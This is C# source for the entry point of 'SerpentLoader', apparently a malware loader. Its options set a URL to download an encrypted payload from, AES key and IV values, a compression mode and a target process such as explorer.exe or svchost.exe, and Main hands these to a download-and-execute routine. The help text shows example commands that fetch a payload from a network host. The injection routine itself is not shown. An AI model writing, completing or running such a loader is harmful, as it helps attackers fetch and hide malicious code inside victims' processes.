using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO.Compression;

namespace serpent
{
    class Program
    {

        #region Main Entry Point

        /// <summary>
        /// Main entry point for the loader
        /// Parses command line arguments and initiates the loading process
        /// </summary>
        public static void Main(string[] args)
        {
            // Default configuration
            string url = "https://127.0.0.1/payload.enc";
            string targetBinary = "explorer.exe";
            string compression = "gzip";  // Default changed to gzip
            byte[] aesKey = null;
            byte[] aesIV = null;

            // Parse command line arguments
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--url":
                        if (i + 1 < args.Length) url = args[++i];
                        break;
                    case "--target":
                        if (i + 1 < args.Length) targetBinary = args[++i];
                        break;
                    case "--compression":
                        if (i + 1 < args.Length) compression = args[++i];
                        break;
                    case "--key":
                        if (i + 1 < args.Length) aesKey = ParseHex(args[++i]);
                        break;
                    case "--iv":
                        if (i + 1 < args.Length) aesIV = ParseHex(args[++i]);
                        break;
                    case "--help":
                    case "-h":
                        ShowHelp();
                        return;
                }
            }

            // Execute the loader
            Loader.DownloadAndExecute(url, targetBinary, compression, aesKey, aesIV);
        }

        #endregion

        static byte[] ParseHex(string hex)
        {
            // Remove spaces and convert hex string to byte array
            hex = hex.Replace(" ", "").Replace("0x", "").Replace(",", "");

            if (hex.Length % 2 != 0)
                throw new ArgumentException("Invalid hex string");

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }


        /// <summary>
        /// Displays help information
        /// </summary>
        private static void ShowHelp()
        {
            Console.WriteLine(@"
SerpentLoader

Usage: SerpentLoader.exe [options]

Options:
  --url <url>              Payload URL (default: https://127.0.0.1/payload.enc)
  --target <process>       Target process name (default: explorer.exe)
  --compression <algo>     Compression: deflate9, gzip, none (default: gzip)
  --key <hex>              AES key as hex string (16 bytes = 32 hex chars)
  --iv <hex>               AES IV as hex string (16 bytes = 32 hex chars)
  --help, -h               Show this help

Examples:
  SerpentLoader.exe --url https://192.168.1.100/test.yml?x=123 --target svchost.exe
  SerpentLoader.exe --key 4428472b4b6250655368566d59713374 --iv 38792f423f4528472b4b625065536856
  SerpentLoader.exe --compression gzip --target explorer.exe
");
        }
    }
}